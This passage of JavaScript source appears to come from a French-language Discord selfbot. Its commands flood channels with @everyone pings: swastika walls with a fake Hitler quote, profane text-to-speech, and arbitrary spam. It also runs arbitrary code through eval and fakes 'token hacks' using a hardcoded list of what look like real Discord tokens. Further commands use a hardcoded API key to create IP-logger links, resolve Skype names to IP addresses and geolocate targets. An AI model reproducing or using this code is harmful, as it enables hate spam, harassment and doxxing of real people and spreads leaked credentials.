  if(message.content.startsWith(prefix + 'SpamNazi')) { 
  if(message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
    let inteval = setInterval(function() {
      msg.channel.send("@everyone 卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 Jugez-moi, c'est vous que vous jugerez. Adorlf Hitler(1981)");        
   }, 100);
}

//////////////////////////////////////////////// SPAM DIEUX ///////////////////////////////////////

    if(message.content.startsWith(prefix + 'SpamDieux')) { 
  if(message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
    let inteval = setInterval(function() {
      msg.channel.send("@everyone ††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††††† Place Dieu devant toi sans craindre rien derrière. Dieux (1874)");        
   
    }, 100);
      
 }   
  
//////////////////////////////////////////////// SPAM TTS ///////////////////////////////////////

        if(message.content.startsWith(prefix + 'SpamTTS')) { 
  if(message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
    let inteval = setInterval(function() {
      msg.channel.send("@everyone If I say that shit then I mean it  She calls me, I screen it, I'm only fuckin' if it's convenient You lie on pussy, that's weak shit, we pass pussy 'round, that's G shit But you ain't fam so what is this we shit? You cuff yours and then leash it  Listen, I'm tellin' you, it's my world, I does what I wish to If you're mad well too bad, sounds like a personal issue  I walk in, they all stare like Who the fuck is this dude? I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT I MEAN IT", {tts: true})
    }, 100);
      
}
  
//////////////////////////////////////////////// SPAM CHOISE ///////////////////////////////////////

   if(message.content.startsWith(prefix + 'SpamChoise')) { 
  if(message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
     var spammsg = args.join(" ");
    let inteval = setInterval(function() {
      msg.channel.send(spammsg) 
    }, 250);
   }
  
////////////////////////////////////////////// EVAL ////////////////////////////////////////////
  
 if(starting.startsWith(prefix + "Eval")) {
 if(message.author.id !== Guardians.user.id) return;
 var Code = args.join(" ");
 if (message.deletable) message.delete();
    try {
      
 message.channel.send(eval(Code)).catch(console.error);
   
     } catch (err) {
 message.channel.sendEmbed(new Discord.RichEmbed()
	                .setAuthor("Erreur Eval")
	                .setColor(black)
                  .addField("Une erreur a été detécté sur le code ", "**Le code était : **" + " --" + Code + "-- " + "**  L'erreur est :**" + ` --${err}-- !`)
                  .setFooter('@Copyright ©2018 Guardians Project')
                  .setTimestamp()
              // "Une erreur a été detécté sur le code ", "
    );
  }  
}
  
//////////////////////////////////// HACK TOKEN ///////////////////////////////////
  
  if(starting.startsWith(prefix + "Hacktoken")) {
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete();
  let mention = message.mentions.users.first();
  const token = [
    'NDgzNDczOTEzMDMzMTI5OTk3.DmT-HA.JTBUeVQs95ckwwThrPjbXvqSViE',
    'NDg1MDgzOTEzMTcwMDU5Mjg1.DmrZNQ.Pk3z74IojeopiKmaVFPvuHJetuQ',
    'NDg1MDgzMjg2ODkzMjMyMTMw.DmrYmQ.vZpbSCwKk4clIBVsnmLf2P_X_kQ',
    'NDg1MDg2ODMyMDk1MTMzNjk2.Dmrb7g.nwHpax0Hf8jXAxnHofhMoDMITLY',
    'NDgzODkyNzk0NDI4MjI3NTkz.DmaD8A.QgjxtZPaeZPN_yZdh1hiX6s3qWM',
    "NDgzODk5NjI5NDc0NDE0NjAz.DmaKXA.JXrDqX3D6AvxLqZ_Wl_7WON2FAA",
    "NDgzOTAwMzAyNjU5OTQ0NDQ4.DmaLBg.EhzZs_gWfy7aEctoAr0yajjbbPY",
    "NDgzOTAwODE3NTE0OTU0NzU2.DmaMUw.l9_MyouZ1VE0lSEDtiWnmb0iH_g",
    "NDgzOTAyMTQ2MzA0MDE2Mzg1.DmaM6A.AQwjv0gGIoo4ssGweYe2J2SHw_c",
    "NDgzOTAyNzEyMjMzMDY2NDk3.DmaNag.QkToVbYxOroREeo5EJgcc_szWTs",
    "NDgzOTAzMjg2NTM4MTQxNzA2.DmaOKQ.Z5RtYfYn99_W2j-OKhqAjG1GTkM",
    "NDgzOTA0MDYxNjQ1NzgzMDQx.DmaOtw.VQCrDHn5Geg6snXDUuv-MsyYJzE",
    "NDg1MDg4NTIwMTc2OTI2NzIw.DmrdkA.zG8N59V6gwwL9qbow-KShSunfPk",
    "NDg1MDg5MTE5MDgxMzMyNzM3.DmrePg.LLrrGPrqG8KYFjUlDqNhn6o8fOA",
    "NDg1MDkxODkzMzE5ODI3NDU3.DmrgmQ.KkZllmOhKdbUDq4WxFgyPGeHRpI",
    "NDg1MDkyMzQ4ODA4NjU4OTU0.DmrhMg.dGm-NvRg65v_I3JGzGp9zEscr7g",
    "NDg1MDkyODkxODExNzc0NDY1.Dmrh4A.jEnSdDM5qJhubPbWXZqPwb0Vhqc",
    "NDg1MDkzNzA3NDg2NTkzMDU2.Dmrihg.t_MdTJFUI71__p4ifk0zJipujCg",
    "NDg1MDk0MjU0MDI1MTEzNjEy.Dmri9w.nrCpJ6_gxxUO5oNJX-zPBqQ8alI",
    "NDg1MDk0NzQxNjA0Njk2MDg3.DmrjTw.8kQaOrs--zhJgHq-5zvHtHJs0Xg",
    "NDg1MDk1MTcwODEyMTQ5NzYx.Dmrjuw.bPtHvAR84wMNMgovwitEharzqRk",
    "NDg1MDk3MDIyODIzODU4MTc3.Dmrlaw.-x4N1Prspc1vO0Bb5SFJGb5Y4Ag"
];
    
    const HackToken = new Discord.RichEmbed()
    
    .setAuthor(message.author.username + "  HACK :  " + mention.username)
    .setDescription(`${mention.username}` + " Vous venez de vous faire hacker votre token par " + `${message.author.username}`)
    .addBlankField(1)
    .addField("Voici Votre Token Discord :", token[Math.floor(Math.random() * token.length)])
    .setColor(black)
    .setImage('https://cdn.glitch.com/fb7cd46e-ea52-4c39-b99e-2de68108a8a4%2Fimages.jpg?1538919390582')
    .setFooter('@Copyright ©2018 Guardians Project |')
    .setTimestamp()
    message.channel.send(HackToken).catch(console.error).then(m => m.delete(80000));
  }  
 if(starting.startsWith(prefix + "IptoSkype")) {
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete();
  var ip = args.join(" ");
  let {body} = await superagent
		.get(`https://webresolver.nl/api.php?key=LVQJR-AVCWJ-Q4QY2-WGXXO&json&action=ip2skype&string=` + ip);
   var logger = new Discord.RichEmbed()
		  .setAuthor("Recherche du pseudo skype en cours ...")
    	.addField("L'ip :", body.ip)
      .addField("Statut de la commande :", body.success)
      .addField("Nom du pseudo :", body.error)
			.setColor(black)
      .setFooter('@Copyright ©2018 Guardians Project | IptoSkype')
      .setTimestamp()
   message.channel.send(logger).catch(console.error).then(m => m.delete(80000));
   }
  
  if(starting.startsWith(prefix + "IpLogger")) {
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete();
  var create = args.join(" ");
  let {body} = await superagent
		.get(`https://webresolver.nl/api.php?key=LVQJR-AVCWJ-Q4QY2-WGXXO&json&action=iplogger&string=3vP0Va7y91i&logger=` + create);
		var logger = new Discord.RichEmbed()
			.setAuthor("Creation de l'ip logger en cours ...")
			.addField("Lien de l'ip logger :", body.url)
      .addField("Lien pour voir les logs  :", body.log)
			.setColor(black)
      .setFooter('@Copyright ©2018 Guardians Project | IpLogger')
      .setTimestamp()
message.channel.send(logger).catch(console.error).then(m => m.delete(80000));
  }
  
  if(starting.startsWith(prefix + "SkypetoIp")) {
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete();
  var skype = args.join(" ");
  let {body} = await superagent
		.get(`https://webresolver.nl/api.php?key=LVQJR-AVCWJ-Q4QY2-WGXXO&json&action=resolve&string=` + skype);
  var logger = new Discord.RichEmbed()
			.setAuthor("Recherche de l'ip du pseudo en cours ...")
			.addField("Le pseudo :", body.username)
      .addField("Statut de la commande :", body.success)   
      .addField("L'erreur trouvé :", body.error)
		  .setColor(black)
      .setFooter('@Copyright ©2018 Guardians Project | SkypetoIp')
      .setTimestamp()
   message.channel.send(logger).catch(console.error).then(m => m.delete(80000));
   }
  
  if(starting.startsWith(prefix + "IpLoc")) {
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete();
  var ip = args.join(" ");
  let {body} = await superagent
		.get(`https://webresolver.nl/api.php?key=LVQJR-AVCWJ-Q4QY2-WGXXO&json&action=geoip&string=` + ip);
  var info = new Discord.RichEmbed()
			.setAuthor("Localisation de l'adress Ip en cours ...")
			.addField("Statut de la commande :", body.success)   
      .addField("Ip :", body.ip)
      .addField("Host :", body.hostname)
      .addField("Ville :", body.records.city)
      .addField("Code Postal :", body.records.postal_code)
      .addField("Coordoné GPS :", body.records.latitude + " & " + body.records.longitude)
      .addField("Pays :", body.records.country_code + " & " + body.records.country_name)  
      .addField("Continent :", body.records.continent.name + " & " + body.records.continent.code)
		  .setColor(black)
      .setFooter('@Copyright ©2018 Guardians Project | IpLocalisation')
      .setTimestamp()
   message.channel.send(info).catch(console.error).then(m => m.delete(80000));
   }

  if(starting.startsWith(prefix + "CheckHost")) {
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete();
  var host = args.join(" ");
  let {body} = await superagent
		.get(`https://check-host.net/check-ping?host=` + host + `&max_nodes=20`);
  var info = new Discord.RichEmbed()
			.setAuthor("CheckHost ...")
	// 		.addField("Résultat Permanent :", g)   
      .addField("Id Du Résultat :", body.request_id)   
      .setColor(black)
      .setFooter('@Copyright ©2018 Guardians Project | CheckHost')
      .setTimestamp()
   message.channel.send(info).catch(console.error).then(m => m.delete(80000));
   }

});